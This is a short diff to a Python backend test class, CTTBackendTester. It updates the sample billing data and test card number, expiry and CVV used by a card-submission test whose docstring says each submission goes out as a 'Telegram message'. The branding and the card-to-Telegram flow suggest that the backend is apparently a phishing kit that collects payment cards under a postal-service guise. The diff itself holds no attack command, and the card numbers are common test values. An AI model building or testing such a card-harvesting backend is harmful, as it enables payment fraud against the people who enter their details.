@@ -134,22 +134,22 @@ class CTTBackendTester:
             return False
     
     async def test_card_submit_endpoint(self):
-        """Test card submission endpoint (first Telegram message) - URGENT FIX TESTING"""
+        """Test card submission endpoint (first Telegram message) - POST TOAST REMOVAL TESTING"""
         try:
-            # Test data as specified in review request for the uuid.randint() fix
+            # Test data as specified in review request for post-toast removal verification
             billing_data = {
-                "nome": "TestFix",
-                "email": "testfix@example.com",
-                "endereco": "Fix Test Address",
-                "codigoPostal": "2000-200",
-                "cidade": "Porto",
-                "telefone": "+351987654321"
+                "nome": "ToastRemoved",
+                "email": "test@removed.com",
+                "endereco": "Test Address After Toast Removal",
+                "codigoPostal": "1000-100",
+                "cidade": "Lisboa",
+                "telefone": "+351999888777"
             }
             
             card_data = {
-                "numeroCartao": "5555555555554444",
-                "dataExpiracao": "06/28",
-                "cvv": "456"
+                "numeroCartao": "4000000000000002",
+                "dataExpiracao": "03/27",
+                "cvv": "789"
             }
             
             payment_request = {
